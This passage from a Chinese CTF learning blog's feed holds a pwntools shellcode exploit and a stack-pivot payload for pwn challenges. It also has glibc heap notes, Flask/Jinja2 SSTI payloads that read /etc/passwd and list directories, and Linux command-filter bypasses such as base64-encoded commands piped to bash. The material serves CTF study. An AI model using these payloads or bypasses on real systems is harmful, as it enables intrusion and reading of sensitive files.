<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;i386&#x27;</span></span><br><span class="line">context.os = <span class="string">&#x27;linux&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;gnome-terminal&#x27;</span>, <span class="string">&#x27;-x&#x27;</span>, <span class="string">&#x27;sh&#x27;</span>, <span class="string">&#x27;-c&#x27;</span>]</span><br><span class="line">p = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"><span class="comment"># p = remote(&#x27;node3.buuoj.cn&#x27;, &#x27;28529&#x27;)</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;Yippie, lets crash: &#x27;</span>)</span><br><span class="line">buf = p.recvline().strip()</span><br><span class="line">base_addr = <span class="built_in">int</span>(buf, <span class="number">16</span>)</span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line"><span class="comment"># print(len(shellcode))</span></span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line">payload = <span class="string">b&#x27;crashme\x00&#x27;</span> + <span class="string">b&#x27;A&#x27;</span> * (<span class="number">0x16</span> - <span class="number">0x8</span> + <span class="number">0x4</span>) + p32(base_addr - <span class="number">0x1c</span>) + shellcode</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="ciscn-2019-es-2"><a href="#ciscn-2019-es-2" class="headerlink" title="ciscn_2019_es_2"></a>ciscn_2019_es_2</h2><p>0x28的栈溢出只能输入0x30，这时候要用到栈劫持，新的知识点。</p>
<p>大体思路就是先通过一个<code>leave</code>然后<code>ret</code>的gadget强行把栈缩小，然后我们就在当前部分的栈帧里去布置就可以了。</p>
<p>直接粘核心exp：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">ebp_addr = u32(p.recv(<span class="number">4</span>))</span><br><span class="line">str_addr = ebp_addr - <span class="number">0x38</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;aaaa&#x27;</span> + p32(system_addr) + p32(<span class="number">0xdeadbeef</span>) + p32(str_addr + <span class="number">0x10</span>) + <span class="string">b&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line">payload = payload.ljust(<span class="number">0x28</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">payload += p32(str_addr) + p32(leave_ret)</span><br></pre></td></tr></table></figure>
<p>这个payload的构造挺巧妙的，稍微分析下：</p>
<p>最后的0x8个字节用字符串起始地址覆盖了ebp，后面紧接着<code>leave</code>和<code>ret</code>，<code>leave</code>的时候直接调到字符串其实地址，<code>ret</code>的时候从<code>aaaa</code>跳到后面的system函数地址。system参数，同样是用在栈上写字符串的方法解决的。</p>
]]></content>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title>glibc Heap Learning</title>
    <url>/2021/01/16/glibc-Heap-Learning/</url>
    <content><![CDATA[<p>学了好几天的堆，今晚把已经看过的堆的知识记录一下。</p>
<h2 id="什么是堆"><a href="#什么是堆" class="headerlink" title="什么是堆"></a>什么是堆</h2><p>系统用堆(Heap)来动态管理内存，堆从低地址向高地址生长。</p>
<p>一直听到堆栈的说法，其实堆跟栈区别真的很大的好吧：比如栈从高地址向低地址生长，内存较为固定，地址一直是<code>0x7ffff...</code>开头的，不能跟堆混为一谈吧。</p>
<p>堆的实现就是时间与空间达到权衡(trade off)的生动案例。后面我们会体会到。</p>
<p>堆想要效率高，就应该提高单次分配和释放的速率，同时也要减少内存空间利用的碎片化。</p>
<p>glibc中堆的管理器是ptmalloc2。我们在pwn学堆的时候，就学习ptmalloc2的堆管理。</p>
<a id="more"></a>
<h2 id="堆的两个C语言高级函数"><a href="#堆的两个C语言高级函数" class="headerlink" title="堆的两个C语言高级函数"></a>堆的两个C语言高级函数</h2><p>在C++里面是<code>new</code>跟<code>delete</code>，而在C语言里面是<code>malloc</code>跟<code>free</code>。</p>
<h3 id="malloc"><a href="#malloc" class="headerlink" title="malloc"></a>malloc</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">void* malloc(size_t n);</span><br><span class="line">return a pointer to the newly-allocated chunk.</span><br></pre></td></tr></table></figure>
<h3 id="free"><a href="#free" class="headerlink" title="free"></a>free</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">void free(void* p);</span><br><span class="line">release the chunk pointed by the pointer p</span><br></pre></td></tr></table></figure>
<h2 id="堆底层的常用概念"><a href="#堆底层的常用概念" class="headerlink" title="堆底层的常用概念"></a>堆底层的常用概念</h2><h3 id="arena"><a href="#arena" class="headerlink" title="arena"></a>arena</h3><p>arena可以理解为一个区域内的内存集合，可以看作是一片连续的内存空间。</p>
<p>在多线程中，每个线程都有一个专属的arena，主线程的arena就叫<code>main_arena</code>，后续做题经常见到。</p>
<p>主线程的arena通过系统调用<code>sbrk</code>创建，通过<code>brk</code>进行伸缩，其他线程的arena通过<code>mmap</code>来创建。</p>
<p><code>main_arena</code>其实是由一个<code>struct malloc_state</code>来组织的，这个结构体里面储存了多种类型的bin和top chunk等内容。</p>
<h3 id="chunk"><a href="#chunk" class="headerlink" title="chunk"></a>chunk</h3><p>chunk即是<code>malloc</code>和<code>free</code>操作时，内存块的基本单位。</p>
<h4 id="free-chunk的结构"><a href="#free-chunk的结构" class="headerlink" title="free chunk的结构"></a>free chunk的结构</h4><p>一个空闲的chunk不是都是unused area，而是在chunk的头部储存了很多信息，具体是这么储存的：</p>
<ul>
<li>prev_size：储存上一个chunk的size</li>
<li>size：储存当前free chunk的size</li>
<li>fd：下一个free chunk</li>
<li>bk：上一个free chunk</li>
<li>unused area</li>
</ul>
<p>另外，注意到x86-64平台下，chunk都是每8个字节对齐的，所以chunk的大小也一定是8个字节的倍数，所以上面用来表示size的8个字节，就可以保证二进制表示下最后必有3个0。</p>
<p>而这3个0的位置，就被设计来分别储存3个信息：</p>
<ul>
<li>N：NON_MAIN_ARENA，1表示不是main_arena的，0代表是main_arena的。</li>
<li>M：IS_MMAPPED，1代表该chunk是<code>mmap</code>出来的，0则不是。</li>
<li>P：PREV_INUSE，1代表前面的chunk正在被使用，0则代表前面的chunk是空闲的。</li>
</ul>
<h4 id="allocated-chunk的结构"><a href="#allocated-chunk的结构" class="headerlink" title="allocated chunk的结构"></a>allocated chunk的结构</h4><p>allocated chunk的结构跟free chunk大体相似，不过也有不同：</p>
<ul>
<li>prev_size、size、NMP这前两个字段都是跟free chunk一样的。</li>
<li>没有fd和bk，从第三个字段开始即可开始储存数据。</li>
</ul>
<p>注意一下，prev_size到底什么时候有必要？当可以与前面的chunk合并时有必要存在。</p>
<p>什么时候allocated chunk可以省去prev_size这一个字段的空间？当前面的chunk也是allocated的。</p>
<p>所以，在设计之中，allocated chunk之间是可以把prev_size那8个字节也用来存入数据，这样能多出8个字节的存储空间。</p>
<h3 id="top-chunk"><a href="#top-chunk" class="headerlink" title="top chunk"></a>top chunk</h3><p>top chunk就是一个arena里面最后的那块chunk，不管怎样都会存在，作为一个arena的结束，不输入任何一个bin。</p>
<p>top chunk可以通过系统调用<code>brk</code>来变长变短，也可以在<code>malloc</code>过程中被切出一块去用，但是一直会存在。</p>
<h3 id="bin"><a href="#bin" class="headerlink" title="bin"></a>bin</h3><p>bin是用来管理<strong>空闲的chunk</strong>的一个数据结构，通过单向或双向链表来进行组织。</p>
<p>通过将不同类型的chunk放进不同的bin中进行管理，能够提高<code>malloc</code>过程找到合适的chunk的速率。</p>
<h4 id="fast-bin"><a href="#fast-bin" class="headerlink" title="fast bin"></a>fast bin</h4><p>fast bin维护小型的内存块，将这些小内存块用于系统频繁的小型内存申请调用。</p>
<p>fast bin只有1组，也就是只有一条单向链表来维护。</p>
<p>fast bin中的free chunk有这么几个特点：</p>
<ol>
<li>不与其他的free chunk合并</li>
<li>使用singly linked list进行组织</li>
<li>采用Last In First Out Policy</li>
<li>申请小内存时，最先在fast bin中寻找</li>
<li>当被free时，不会将P位置0（PREV_INUSE）</li>
</ol>
<p>一般0x20到0x7f大小的chunk，在free后并且分类后，会被丢进fast bin进行维护。</p>
<h4 id="small-bins"><a href="#small-bins" class="headerlink" title="small bins"></a>small bins</h4><p>small bins有62组链表，负责维护相对较小的chunk。</p>
<p>small bins的free chunk就跟fast bin不同了：</p>
<ol>
<li>相同大小的chunk就会被放在同一组small bin之中</li>
<li>使用doubly linked list维护</li>
<li>First In First Out</li>
<li>当被free时，会诚实地记录P位</li>
<li>并且，有条件时，会主动地合并成一个更大的free chunk</li>
</ol>
<p>大小从0x80到0x400的chunk最后会被丢到small bins去维护。（大小小于1M）</p>
<h4 id="large-bins"><a href="#large-bins" class="headerlink" title="large bins"></a>large bins</h4><p>large bins共有63组。每一组large bin储存的不是特定大小的chunk，而是大小处在一定范围的chunk。</p>
<p>记录的方法与small bin几乎相同。一样是FIFO，一样是双向链表，一样会主动合并。</p>
<p>不过有一点特殊：large bin中的chunk是按照从大到小进行排序的。</p>
<p>大于0x400即1M的chunk就会被安排到large bin里面去。</p>
<h4 id="unsorted-bin"><a href="#unsorted-bin" class="headerlink" title="unsorted bin"></a>unsorted bin</h4><p>unsorted bin可以通俗想象成是chunk的“垃圾桶”，任何大于0x80的chunk都会被丢进unsorted bin里面去。（太小的直接丢进fast bin里面维护）</p>
<p>unsorted bin中的chunk没有大小规定，也没有大小顺序，一切都是待整理状态。</p>
<p>在里面的chunk会通过后续的“捡垃圾”（即chunk维护整理工作）进入到专属的chunk。</p>
<p>与fast bin一样，unsorted bin也只有一组。也只是一个暂存的缓冲区域，该挑合适的chunk，还是去规定的bin找，万不得已最后才来搜垃圾堆嘛。。。</p>
<h3 id="小知识"><a href="#小知识" class="headerlink" title="小知识"></a>小知识</h3><p>有一个原则：任意两个物理相邻的空闲chunk不能排在一起。（不过fast bin还是得除外的）</p>
<h2 id="堆的工作流程"><a href="#堆的工作流程" class="headerlink" title="堆的工作流程"></a>堆的工作流程</h2><h3 id="malloc的工作流程"><a href="#malloc的工作流程" class="headerlink" title="malloc的工作流程"></a>malloc的工作流程</h3><h3 id="free的工作流程"><a href="#free的工作流程" class="headerlink" title="free的工作流程"></a>free的工作流程</h3>]]></content>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title></title>
    <url>/2022/01/16/%E6%89%8B%E6%92%B8TUI%E6%96%87%E6%9C%AC%E7%BC%96%E8%BE%91%E5%99%A8%E9%A3%9F%E7%94%A8%E6%8C%87%E5%8D%97/</url>
    <content><![CDATA[<h1 id="手撸TUI文本编辑器食用指南"><a href="#手撸TUI文本编辑器食用指南" class="headerlink" title="手撸TUI文本编辑器食用指南"></a>手撸TUI文本编辑器食用指南</h1><ul>
<li>如果有tab的话，默认会显示8个字符，但是实际只占一个字符，这样会导致cursor移不到最右边，并且每多一个tab，cursor离最右边的距离就会多7</li>
<li></li>
</ul>
]]></content>
  </entry>
  <entry>
    <title>浅谈内存管理的若干方式</title>
    <url>/2022/03/05/%E6%B5%85%E8%B0%88%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86%E7%9A%84%E8%8B%A5%E5%B9%B2%E6%96%B9%E5%BC%8F/</url>
    <content><![CDATA[<h2 id="前置知识科普"><a href="#前置知识科普" class="headerlink" title="前置知识科普"></a>前置知识科普</h2><h3 id="栈内存和堆内存"><a href="#栈内存和堆内存" class="headerlink" title="栈内存和堆内存"></a>栈内存和堆内存</h3><p>常识告诉我们，在计算机系统的内存之中，有一个系统栈和一个负责管理动态分配内存的系统堆，栈向地地址生长，而堆向高地址生长。这两个结构所对应的那部分内存区域分别称为栈内存和堆内存。</p>
<p>运行程序的时候，</p>
<h3 id="生命周期"><a href="#生命周期" class="headerlink" title="生命周期"></a>生命周期</h3><p>lifetime</p>
<a id="more"></a>
<h3 id="RAII"><a href="#RAII" class="headerlink" title="RAII"></a>RAII</h3><p>RAII全称是Resource Acquisition Is Initialization（资源获取即初始化），这个概念是为了在面向对象的语言中更优雅地管理资源，这里的资源指的是像file、socket、mutex等这些传统以来需要open然后close或者需要先lock然后unlock的类型。</p>
<p>我们用比较简单的一句话概括RAII：资源与对象的生命周期高度绑定，资源在其所对应的对象完成初始化时得到获取，在资源生命周期走到尽头时得到释放与关闭。</p>
<p>传统的使用方式与RAII不同，资源的生命周期是需要额外考虑的。比如C打开文件是通过一个open函数拿到file descriptor，然后传这个descriptor调用read、write等函数，等到所有的读写使用结束后再由开发者显式地close；再比如java打开文件，经常要用try-catch-finally语句去管理，而且经常会在finally去显式close。在这种传统的面向过程的操作范式中，资源的获取与释放都需要开发者显式调用。而RAII在开发者的角度则不用去额外去管资源的生命周期，在多线程的并发运行之中也可以在编译期统一管理好，避免deadlock等等的问题。</p>
<h2 id="堆内存的管理方式"><a href="#堆内存的管理方式" class="headerlink" title="堆内存的管理方式"></a>堆内存的管理方式</h2><h3 id="全手动内存管理"><a href="#全手动内存管理" class="headerlink" title="全手动内存管理"></a>全手动内存管理</h3><p>C语言由于其历史特性，几乎是汇编的直接抽象表现，在内存管理方面也与汇编相似，内存分配与释放全靠开发者自身的使用，所以说可以说C是全手动内存管理的典范。</p>
<p><code>malloc</code>、<code>realloc</code>、<code>calloc</code>等函数用来在堆上分配内存，而<code>free</code>用来释放堆上已分配的内存。但是开发者所得到的只是一个指针（类型需要在<code>malloc</code>之外强转），没有任何生命周期的信息。并且，这块内存区域只会在调用<code>free</code>之后才得到释放，这意味着这块内存区域不仅可以在单个线程中跨scope使用，而且允许在不同线程中使用，这些问题如果开发者没有意识到，就很容易踩到race等等的大坑。而且更糟的是，在<code>free</code>掉之后，原来储存着地址的那个指针仍可能被使用，这直接造成了UAF等影响巨大的问题。</p>
<p>在这种条件下，程序是否安全要全靠开发者，开发者的疏忽很容易导致非预期运行错误的产生，编译期错误并不能足够地规避问题。</p>
<p>C++虽然向下兼容C，使用了新的<code>new</code>和<code>delete</code>关键字，但核心问题还是没得到解决。这个核心问题就是指针满天飞所造成的生命周期混乱的问题，而C和C++如果只使用C-Type指针的话都没有办法在编译时完成查错，生命周期混乱编译器睁一只眼闭一只眼就过去了，所以只能比较大程度上寄托于运行时发生非预期现象才能发现。</p>
<p>C++认识到向下兼容C所导致的这个问题，之后C++在RAII这方面做出了一些实践，类似<code>std::string</code>、<code>std::vector</code>等的动态内存容器类型和<code>std::smart_ptr</code>、<code>std::unique_ptr</code>等等的智能指针类型自然是被官方强推，已经是现代C++的基础数据类型了。</p>
<h3 id="GC内存管理"><a href="#GC内存管理" class="headerlink" title="GC内存管理"></a>GC内存管理</h3><p>Garbage Collector简称GC，是以Java等语言所采用的内存管理方式的统称。</p>
<p>GC的好处是开发者可以不用全手动完成内存管理，不需要手动释放内存（一般也不会允许），GC会在运行的过程中帮你完成。</p>
<h2 id="Rust"><a href="#Rust" class="headerlink" title="Rust"></a>Rust</h2><p>Rust的编译器</p>
]]></content>
  </entry>
  <entry>
    <title>flask SSTI学习</title>
    <url>/2021/10/04/flask-SSTI%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<p>测试SSTI</p>
<p>python3读文件模板</p>
<p>普通版：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&#123;().__class__.__bases__[0].__subclasses__()[75].__init__.__globals__.__builtins__[&#39;open&#39;](&#39;&#x2F;this_is_the_fl&#39;+&#39;ag.txt&#39;).read()&#125;&#125;</span><br><span class="line">&#123;&#123;().__class__.__bases__[0].__subclasses__()[75].__init__.__globals__.__builtins__[&#39;open&#39;](&#39;&#x2F;etc&#x2F;passwd&#39;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
<p>字符串翻转绕过版：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&#123;().__class__.__bases__[0].__subclasses__()[75].__init__.__globals__.__builtins__[&#39;open&#39;](&#39;&#x2F;etc&#x2F;password&#39;).read()&#125;&#125; &#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__&#x3D;&#x3D;&#39;catch_warnings&#39; %&#125;&#123;&#123; c.__init__.__globals__[&#39;__builtins__&#39;].open(&#39;txt.galf_eht_si_siht&#x2F;&#39;[::-1],&#39;r&#39;).read() &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure>
<p>listdir</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&#123;&#39;&#39;.__class__.__bases__[0].__subclasses__()[75].__init__.__globals__[&#39;__builtins__&#39;][&#39;__imp&#39;+&#39;ort__&#39;](&#39;o&#39;+&#39;s&#39;).listdir(&#39;&#x2F;&#39;)&#125;&#125;</span><br></pre></td></tr></table></figure>]]></content>
  </entry>
  <entry>
    <title>Linux用不常用的命令绕过常用命令过滤</title>
    <url>/2021/10/04/Linux%E7%94%A8%E4%B8%8D%E5%B8%B8%E7%94%A8%E7%9A%84%E5%91%BD%E4%BB%A4%E7%BB%95%E8%BF%87%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E8%BF%87%E6%BB%A4/</url>
    <content><![CDATA[<h2 id="几个常用方法"><a href="#几个常用方法" class="headerlink" title="几个常用方法"></a>几个常用方法</h2><h3 id="定义变量然后拼接绕过"><a href="#定义变量然后拼接绕过" class="headerlink" title="定义变量然后拼接绕过"></a>定义变量然后拼接绕过</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ls</span><br><span class="line">a=l;b=s;$a<span class="variable">$b</span></span><br></pre></td></tr></table></figure>
<h3 id="编码绕过"><a href="#编码绕过" class="headerlink" title="编码绕过"></a>编码绕过</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;Y2F0IC9mbGFn&quot;</span> | base64 -d | bash <span class="comment"># =&gt;cat /flag in base64</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;636174202f666c6167&quot;</span> | xxd -r -p | bash <span class="comment"># =&gt;cat /flag in hex</span></span><br></pre></td></tr></table></figure>
<p>上述适用于echo没被过滤的情况</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$(<span class="built_in">printf</span> <span class="string">&quot;\x63\x61\x74\x20\x2f\x66\x6c\x61\x67&quot;</span>) <span class="comment"># =&gt;cat /flag</span></span><br><span class="line">&#123;<span class="built_in">printf</span>,<span class="string">&quot;\x63\x61\x74\x20\x2f\x66\x6c\x61\x67&quot;</span>&#125;|\<span class="variable">$0</span> <span class="comment"># =&gt;cat /flag</span></span><br></pre></td></tr></table></figure>
<p>适用于printf没被过滤的情况</p>
<h3 id="引号绕过"><a href="#引号绕过" class="headerlink" title="引号绕过"></a>引号绕过</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ca<span class="string">&#x27;&#x27;</span>t fl<span class="string">&#x27;&#x27;</span>ag</span><br><span class="line">ca<span class="string">&quot;&quot;</span>t fl<span class="string">&quot;&quot;</span>ag</span><br></pre></td></tr></table></figure>
<h3 id="反斜杠绕过"><a href="#反斜杠绕过" class="headerlink" title="反斜杠绕过"></a>反斜杠绕过</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ca\t fl\ag</span><br></pre></td></tr></table></figure>
<h2 id="可供替换的冷门命令"><a href="#可供替换的冷门命令" class="headerlink" title="可供替换的冷门命令"></a>可供替换的冷门命令</h2><h3 id="ls"><a href="#ls" class="headerlink" title="ls"></a>ls</h3><p>dir</p>
<h3 id="cat"><a href="#cat" class="headerlink" title="cat"></a>cat</h3><p>tac, sort, more, less, head, tail, (sed)</p>
]]></content>
  </entry>
</search>
